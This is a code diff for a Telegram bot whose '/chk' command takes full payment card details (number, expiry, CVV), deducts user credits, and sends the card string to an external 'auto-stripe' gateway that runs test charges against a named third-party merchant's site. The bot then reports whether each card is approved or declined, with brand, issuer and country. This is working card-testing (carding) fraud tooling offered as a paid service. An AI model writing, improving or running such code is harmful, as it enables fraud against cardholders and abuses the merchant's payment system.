@@ -690,28 +690,34 @@ async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 import time
 import asyncio
 import aiohttp
+import random
+from datetime import datetime
 from telegram import Update
 from telegram.constants import ParseMode
 from telegram.helpers import escape_markdown
 from telegram.ext import ContextTypes
 
-# --- Your existing user data and cooldown logic ---
-
+# In-memory cooldown and user data store examples
 user_cooldowns = {}
 user_data_store = {}
 
+def escape_markdown_v2(text: str) -> str:
+    escape_chars = r'\_*[]()~`>#+-=|{}.!'
+    return ''.join('\\' + c if c in escape_chars else c for c in text)
+
 async def enforce_cooldown(user_id: int, update: Update) -> bool:
-    last_run_time = user_cooldowns.get(user_id, 0)
-    current_time = time.time()
-    cooldown_seconds = 10
-    if current_time - last_run_time < cooldown_seconds:
-        remaining_time = round(cooldown_seconds - (current_time - last_run_time), 2)
+    last_run = user_cooldowns.get(user_id, 0)
+    now = time.time()
+    cooldown = 5  # 5 seconds cooldown
+
+    if now - last_run < cooldown:
+        remaining = round(cooldown - (now - last_run), 2)
         await update.effective_message.reply_text(
-            f"⏳ Cooldown in effect. Please wait {remaining_time} seconds before trying again.",
+            f"⏳ Please wait {remaining} seconds before trying again.",
             parse_mode=ParseMode.MARKDOWN_V2
         )
         return False
-    user_cooldowns[user_id] = current_time
+    user_cooldowns[user_id] = now
     return True
 
 async def get_user(user_id: int) -> dict:
@@ -720,33 +726,100 @@ async def get_user(user_id: int) -> dict:
     return user_data_store[user_id]
 
 async def consume_credit(user_id: int) -> bool:
-    user_data = await get_user(user_id)
-    if user_data['credits'] > 0:
-        user_data['credits'] -= 1
+    user = await get_user(user_id)
+    if user['credits'] > 0:
+        user['credits'] -= 1
         return True
     return False
 
-# Blocking BIN lookup function
+# Blocking BIN details function (simulate)
 def get_bin_details_sync(bin_number: str) -> dict:
-    time.sleep(1.5)  # Simulate blocking network delay
+    # Simulate delay and dummy data
+    time.sleep(1.5)
+    # You can replace this with your actual synchronous BIN lookup code
     return {
         "scheme": "Visa",
         "type": "Credit",
-        "country_name": "United States"
+        "country_name": "United States",
+        "bank": "Sample Bank"
     }
 
-# The actual long-running logic moved here:
-async def do_check_and_edit(processing_msg, cc_normalized, bin_number, user, user_data):
+async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_id = user.id
+
+    # Cooldown check
+    if not await enforce_cooldown(user_id, update):
+        return
+
+    # Check credits
+    user_data = await get_user(user_id)
+    if user_data.get('credits', 0) <= 0:
+        await update.effective_message.reply_text(
+            "❌ You have no credits left\\.",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+        return
+
+    # Parse input
+    raw = context.args[0] if context.args else None
+    if not raw or "|" not in raw:
+        await update.effective_message.reply_text(
+            "Usage: /chk number\\|mm\\|yy\\|cvv",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+        return
+
+    parts = raw.split("|")
+    if len(parts) != 4:
+        await update.effective_message.reply_text(
+            "Invalid format\\. Use number\\|mm\\|yy\\|cvv \\(or yyyy for year\\)\\.",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+        return
+
+    # Normalize year to 2 digits if 4 digits provided
+    if len(parts[2]) == 4:
+        parts[2] = parts[2][-2:]
+    cc_normalized = "|".join(parts)
+
+    # Consume credit
+    if not await consume_credit(user_id):
+        await update.effective_message.reply_text(
+            "❌ You have no credits left\\.",
+            parse_mode=ParseMode.MARKDOWN_V2
+        )
+        return
+
+    # Show processing message immediately
+    processing_text = (
+        "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
+        f"• 𝘾𝙖𝙧𝙙 ➜ `{escape_markdown_v2(cc_normalized)}`\n"
+        "• 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
+        "• 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈\\.\\.\\.\n"
+        "═════════════════════"
+    )
+    processing_msg = await update.effective_message.reply_text(
+        processing_text,
+        parse_mode=ParseMode.MARKDOWN_V2
+    )
+
     start_time = time.time()
 
     try:
+        # Run blocking BIN lookup in thread
+        bin_number = parts[0][:6]
         bin_details = await asyncio.to_thread(get_bin_details_sync, bin_number)
+
         if bin_details is None:
             bin_details = {}
+
         brand = (bin_details.get("scheme") or "N/A").upper()
         issuer = (bin_details.get("type") or "N/A").upper()
         country_name = (bin_details.get("country_name") or "N/A").upper()
+        bank = (bin_details.get("bank") or "N/A").title()
 
+        # Async HTTP request to API (non-blocking)
         api_url = f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=buildersdiscountwarehouse.com.au/cc={cc_normalized}"
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, timeout=25) as resp:
@@ -763,88 +836,33 @@ async def do_check_and_edit(processing_msg, cc_normalized, bin_number, user, use
         elif api_status.lower() == "declined":
             header = "❖❖❖\\[ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌ \\]❖❖❖"
         else:
-            header = f"❖❖❖\\[ {escape_markdown(api_status, version=2)} \\]❖❖❖"
+            header = f"❖❖❖\\[ {escape_markdown_v2(api_status)} \\]❖❖❖"
 
-        formatted_response = f"_{escape_markdown(api_response, version=2)}_"
+        formatted_response = f"_{escape_markdown_v2(api_response)}_"
 
         final_text = (
             f"{header}\n"
-            f"✘ Card        ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
+            f"✘ Card        ➜ `{escape_markdown_v2(cc_normalized)}`\n"
             "✘ Gateway     ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
             f"✘ Response    ➜ {formatted_response}\n"
             "――――――――――――――――\n"
-            f"✘ Brand       ➜ {escape_markdown(brand, version=2)}\n"
-            f"✘ Issuer      ➜ {escape_markdown(issuer, version=2)}\n"
-            f"✘ Country    ➜ {escape_markdown(country_name, version=2)}\n"
+            f"✘ Brand       ➜ {escape_markdown_v2(brand)}\n"
+            f"✘ Issuer      ➜ {escape_markdown_v2(issuer)}\n"
+            f"✘ Bank        ➜ {escape_markdown_v2(bank)}\n"
+            f"✘ Country    ➜ {escape_markdown_v2(country_name)}\n"
             "――――――――――――――――\n"
-            f"✘ Request By  ➜ {escape_markdown(user.first_name, version=2)}\\[{escape_markdown(user_data.get('plan','Free'), version=2)}\\]\n"
-            "✘ Developer   ➜ [kคli liຖนxx](https://t.me/K4linuxx)\n"
-            f"✘ Time        ➜ {escape_markdown(str(time_taken), version=2)} seconds\n"
+            f"✘ Request By  ➜ {escape_markdown_v2(user.first_name)}\\[{escape_markdown_v2(user_data.get('plan','Free'))}\\]\n"
+            f"✘ Developer   ➜ [kคli liຖนxx](https://t.me/K4linuxx)\n"
+            f"✘ Time        ➜ {escape_markdown_v2(str(time_taken))} seconds\n"
             "――――――――――――――――"
         )
         await processing_msg.edit_text(final_text, parse_mode=ParseMode.MARKDOWN_V2)
 
     except Exception as e:
         await processing_msg.edit_text(
-            f"❌ API Error: `{escape_markdown(str(e), version=2)}`",
+            f"❌ API Error: `{escape_markdown_v2(str(e))}`",
             parse_mode=ParseMode.MARKDOWN_V2
         )
-
-# The main /chk command handler:
-async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-
-    if not await enforce_cooldown(user_id, update):
-        return
-
-    user_data = await get_user(user_id)
-    if user_data.get('credits', 0) <= 0:
-        return await update.effective_message.reply_text(
-            "❌ You have no credits left\\.",
-            parse_mode=ParseMode.MARKDOWN_V2
-        )
-
-    raw = context.args[0] if context.args else None
-    if not raw or "|" not in raw:
-        return await update.effective_message.reply_text(
-            "Usage: /chk number\\|mm\\|yy\\|cvv",
-            parse_mode=ParseMode.MARKDOWN_V2
-        )
-
-    parts = raw.split("|")
-    if len(parts) != 4:
-        return await update.effective_message.reply_text(
-            "Invalid format\\. Use number\\|mm\\|yy\\|cvv \\(or yyyy for year\\)\\.",
-            parse_mode=ParseMode.MARKDOWN_V2
-        )
-
-    if len(parts[2]) == 4:
-        parts[2] = parts[2][-2:]
-    cc_normalized = "|".join(parts)
-
-    if not await consume_credit(user_id):
-        return await update.effective_message.reply_text(
-            "❌ No credits left\\.",
-            parse_mode=ParseMode.MARKDOWN_V2
-        )
-
-    processing_text = (
-        "═══\\[ 𝑷𝑹𝑶𝑪𝑬𝑺𝑺𝑰𝑵𝑮 \\]═══\n"
-        f"• 𝘾𝙖𝙧𝙙 ➜ `{escape_markdown(cc_normalized, version=2)}`\n"
-        "• 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ➜ 𝓢𝘁𝗿𝗶𝗽𝗲 𝘈𝘂𝘁𝗵\n"
-        "• 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈\\.\\.\\.\n"
-        "═════════════════════"
-    )
-    processing_msg = await update.effective_message.reply_text(
-        processing_text,
-        parse_mode=ParseMode.MARKDOWN_V2
-    )
-
-    # Run the check as a background task (non-blocking)
-    asyncio.create_task(
-        do_check_and_edit(processing_msg, cc_normalized, parts[0][:6], user, user_data)
-    )
 
 
 
